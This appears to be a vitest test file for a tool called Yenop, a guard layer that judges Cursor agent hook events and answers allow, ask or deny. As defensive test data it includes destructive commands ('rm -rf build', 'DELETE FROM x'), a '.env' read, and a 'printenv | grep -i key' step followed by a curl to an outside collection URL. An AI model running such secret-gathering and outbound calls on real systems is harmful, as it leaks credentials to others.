import { describe, it, expect, beforeEach, afterEach } from "vitest";
import { mkdtempSync, rmSync, mkdirSync, writeFileSync, readFileSync, existsSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { parseCursor, cursorBody, cursorTranslator } from "./hook.js";
import { runHookWith, type HookEvent } from "../hooks/pipeline.js";
import { installCursorHooks, CURSOR_DECISION_EVENTS, CURSOR_REPORT_EVENTS } from "./install.js";

const base = { conversation_id: "c1", generation_id: "g1", cursor_version: "3.6", workspace_roots: ["/p"] };
const ev = (name: string, fields: Record<string, unknown>) => JSON.stringify({ ...base, hook_event_name: name, ...fields });
const decision = (e: HookEvent) => {
  if (e.kind !== "decision") throw new Error(`expected decision, got ${e.kind}`);
  return e;
};

describe("cursor translator: parsing", () => {
  it("maps beforeShellExecution to a shell decision that may ask", () => {
    const e = decision(parseCursor(ev("beforeShellExecution", { command: "rm -rf build", cwd: "/p" })));
    expect(e.askCapable).toBe(true);
    expect(e.request).toMatchObject({ runId: "cursor:c1", cwd: "/p", tool: { name: "Bash", kind: "shell" }, args: { command: "rm -rf build" }, principal: { runtime: "cursor" } });
  });
  it("maps beforeMCPExecution, parsing the JSON-string tool_input defensively", () => {
    const e = decision(parseCursor(ev("beforeMCPExecution", { tool_name: "execute_sql", mcp_server_name: "supabase", tool_input: '{"query":"DELETE FROM x"}' })));
    expect(e.askCapable).toBe(true);
    expect(e.request.tool).toMatchObject({ name: "execute_sql", kind: "mcp", server: "supabase", readOnly: false });
    expect(e.request.args).toEqual({ query: "DELETE FROM x" });
    const bad = decision(parseCursor(ev("beforeMCPExecution", { tool_name: "execute_sql", mcp_server_name: "supabase", tool_input: "not json" })));
    expect(bad.request.args).toEqual({}); // never a crash on the model's malformed string
  });
  it("maps beforeReadFile to a read that can only be allowed or denied", () => {
    const e = decision(parseCursor(ev("beforeReadFile", { file_path: "/p/.env", content: "SECRET=1" })));
    expect(e.askCapable).toBe(false);
    expect(e.request.tool).toMatchObject({ name: "Read", readOnly: true });
    expect(e.request.args).toEqual({ file_path: "/p/.env" }); // content is never carried into a decision
  });
  it("preToolUse judges file mutations, ignores shell and reads, and leaves unknown tools to Cursor", () => {
    const w = decision(parseCursor(ev("preToolUse", { tool_name: "Write", tool_input: { file_path: "/p/a.ts", contents: "x" }, tool_use_id: "t9" })));
    expect(w.askCapable).toBe(false);
    expect(w.request).toMatchObject({ callId: "t9", tool: { kind: "write", readOnly: false }, args: { file_path: "/p/a.ts" } });
    expect(parseCursor(ev("preToolUse", { tool_name: "Shell", tool_input: { command: "ls" } })).kind).toBe("ignore");
    expect(parseCursor(ev("preToolUse", { tool_name: "Read", tool_input: { file_path: "/p/a" } })).kind).toBe("ignore");
    expect(parseCursor(ev("preToolUse", { tool_name: "WebSearch", tool_input: { query: "x" } })).kind).toBe("ignore");
  });
  it("turns postToolUse and postToolUseFailure into outcomes keyed by tool_use_id", () => {
    expect(parseCursor(ev("postToolUse", { tool_name: "Write", tool_use_id: "t1", tool_input: {}, tool_output: "{}", duration: 3 }))).toMatchObject({ kind: "outcome", callId: "t1", outcome: "ran", runId: "cursor:c1" });
    expect(parseCursor(ev("postToolUseFailure", { tool_name: "Write", tool_use_id: "t2", error_message: "boom", failure_type: "error" }))).toMatchObject({ kind: "outcome", callId: "t2", outcome: "failed", detail: "boom" });
  });
  it("ignores events it does not judge", () => {
    for (const name of ["afterAgentResponse", "preCompact", "beforeSubmitPrompt", "subagentStart"]) expect(parseCursor(ev(name, { text: "x", prompt: "y" })).kind).toBe("ignore");
  });
  it("throws on malformed input so the pipeline fails closed", () => {
    expect(() => parseCursor("not json")).toThrow();
    expect(() => parseCursor("{}")).toThrow(/hook_event_name/);
    expect(() => parseCursor(ev("beforeShellExecution", {}))).toThrow(/command/);
    expect(() => parseCursor(ev("beforeMCPExecution", { mcp_server_name: "s" }))).toThrow(/tool_name/);
    expect(() => parseCursor(ev("beforeReadFile", { content: "x" }))).toThrow(/file_path/);
  });
});

describe("cursor translator: answers", () => {
  const dec = (askCapable: boolean): Extract<HookEvent, { kind: "decision" }> => ({ kind: "decision", event: "x", askCapable, request: { runId: "r", principal: { runtime: "cursor", agent: "a", user: "u" }, tool: { name: "Bash", kind: "shell", readOnly: false }, args: {} } });
  it("always prints a full answer for a decision, including allow, because silence makes Cursor block", () => {
    expect(cursorBody("allow", "ok", "enforce", dec(true))).toEqual({ permission: "allow" });
    expect(cursorTranslator.result({ permission: "allow" })).toEqual({ stdout: '{"permission":"allow"}', exitCode: 0 });
  });
  it("asks where it can and explains", () => {
    expect(cursorBody("ask", "Needs a person: destructive-shell.", "enforce", dec(true))).toEqual({ permission: "ask", user_message: "Yenop: Needs a person: destructive-shell." });
  });
  it("degrades an ask to a deny where Cursor cannot ask, never to an allow", () => {
    const b = cursorBody("ask", "Needs a person: mcp-writes.", "enforce", dec(false));
    expect(b["permission"]).toBe("deny");
    expect(String(b["user_message"])).toMatch(/cannot ask a person/);
  });
  it("denies with the reason", () => {
    expect(cursorBody("deny", "Blocked by policy no-secret-files.", "enforce", dec(true))).toEqual({ permission: "deny", user_message: "Yenop: Blocked by policy no-secret-files." });
  });
  it("answers allow in observe mode, so it is recorded but never blocks", () => {
    expect(cursorBody("deny", "x", "observe", dec(true))).toEqual({ permission: "allow" });
  });
  it("prints nothing for non-decision events", () => {
    expect(cursorTranslator.result(null)).toEqual({ stdout: "", exitCode: 0 });
    expect(cursorTranslator.result({})).toEqual({ stdout: "", exitCode: 0 });
  });
  it("blocks with exit 2 when Yenop itself failed", () => {
    const r = cursorTranslator.failure("policies unreadable");
    expect(r.exitCode).toBe(2);
    expect(JSON.parse(r.stdout)).toMatchObject({ permission: "deny" });
  });
});

describe("cursor hooks end to end (in-process, no daemon)", () => {
  let home: string;
  let proj: string;
  const prevHome = process.env["YENOP_HOME"];
  const prevNoDaemon = process.env["YENOP_NO_DAEMON"];
  beforeEach(() => {
    home = mkdtempSync(join(tmpdir(), "yenop-cursor-"));
    proj = join(home, "proj");
    mkdirSync(join(proj, ".cursor"), { recursive: true });
    process.env["YENOP_HOME"] = home;
    process.env["YENOP_NO_DAEMON"] = "1";
  });
  afterEach(() => {
    if (prevHome === undefined) delete process.env["YENOP_HOME"]; else process.env["YENOP_HOME"] = prevHome;
    if (prevNoDaemon === undefined) delete process.env["YENOP_NO_DAEMON"]; else process.env["YENOP_NO_DAEMON"] = prevNoDaemon;
    rmSync(home, { recursive: true, force: true });
  });
  const run = (name: string, fields: Record<string, unknown>) => runHookWith(cursorTranslator, JSON.stringify({ ...base, workspace_roots: [proj], hook_event_name: name, ...fields }));

  it("allows ordinary work, asks on a destructive command, denies a secret read", async () => {
    expect(JSON.parse((await run("beforeShellExecution", { command: "npm test", cwd: proj })).stdout)).toEqual({ permission: "allow" });
    expect(JSON.parse((await run("beforeShellExecution", { command: "rm -rf build", cwd: proj })).stdout)).toMatchObject({ permission: "ask" });
    expect(JSON.parse((await run("beforeReadFile", { file_path: join(proj, ".env"), content: "x" })).stdout)).toMatchObject({ permission: "deny" });
  });
  it("protects its own hook registration: editing .cursor/hooks.json through Cursor is refused", async () => {
    const r = await run("preToolUse", { tool_name: "Write", tool_input: { file_path: join(proj, ".cursor", "hooks.json"), contents: "{}" }, tool_use_id: "t1" });
    const body = JSON.parse(r.stdout) as { permission: string; user_message: string };
    expect(body.permission).toBe("deny"); // an ask that Cursor cannot ask becomes a deny, never an allow
    expect(body.user_message).toMatch(/changes-to-yenop-itself/);
  });
  it("shares run state with the rest of Yenop: a sensitive read then an outside call is held", async () => {
    await run("beforeShellExecution", { command: "printenv | grep -i key", cwd: proj });
    await run("beforeMCPExecution", { tool_name: "fetch_page", mcp_server_name: "web", tool_input: '{"url":"https://forum.example.com"}' });
    const r = await run("beforeShellExecution", { command: "curl -s https://api.other.example.com/collect", cwd: proj });
    expect(JSON.parse(r.stdout)).toMatchObject({ permission: "ask" });
    expect(String((JSON.parse(r.stdout) as { user_message: string }).user_message)).toMatch(/lethal-trifecta|external-network-after-sensitive-data/);
  });
  it("writes receipts tagged with the cursor runtime", async () => {
    await run("beforeShellExecution", { command: "npm test", cwd: proj });
    const last = readFileSync(join(home, "receipts.jsonl"), "utf8").trim().split("\n").pop()!;
    expect(JSON.parse(last)).toMatchObject({ runtime: "cursor", tool: "Bash", effect: "allow" });
  });
  it("fails closed on malformed input", async () => {
    await expect(runHookWith(cursorTranslator, "garbage")).rejects.toThrow();
  });
});

describe("cursor installer", () => {
  let dir: string;
  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), "yenop-cursor-inst-"));
  });
  afterEach(() => rmSync(dir, { recursive: true, force: true }));

  it("writes every decision event with failClosed and every report event without, idempotently", () => {
    const path = join(dir, ".cursor", "hooks.json");
    const first = installCursorHooks(path, "yenop hook cursor");
    expect(first.changed).toBe(true);
    const file = JSON.parse(readFileSync(path, "utf8")) as { version: number; hooks: Record<string, { command: string; failClosed?: boolean }[]> };
    expect(file.version).toBe(1);
    for (const e of CURSOR_DECISION_EVENTS) expect(file.hooks[e]).toEqual([{ command: "yenop hook cursor", type: "command", timeout: 15, failClosed: true }]);
    for (const e of CURSOR_REPORT_EVENTS) expect(file.hooks[e]![0]!.failClosed).toBeUndefined();
    expect(installCursorHooks(path, "yenop hook cursor").changed).toBe(false);
    expect(JSON.parse(readFileSync(path, "utf8")).hooks.beforeShellExecution).toHaveLength(1);
  });
  it("keeps other people's hooks and replaces an older Yenop entry", () => {
    const path = join(dir, ".cursor", "hooks.json");
    mkdirSync(join(dir, ".cursor"), { recursive: true });
    writeFileSync(path, JSON.stringify({ version: 1, hooks: { beforeShellExecution: [{ command: "./block-rm.sh" }, { command: "/old/yenop hook cursor" }] } }));
    installCursorHooks(path, "yenop hook cursor");
    const hooks = JSON.parse(readFileSync(path, "utf8")).hooks.beforeShellExecution as { command: string }[];
    expect(hooks.map((h) => h.command)).toEqual(["./block-rm.sh", "yenop hook cursor"]);
    expect(existsSync(`${path}.${process.pid}.tmp`)).toBe(false); // atomic write left no temp file
  });
});
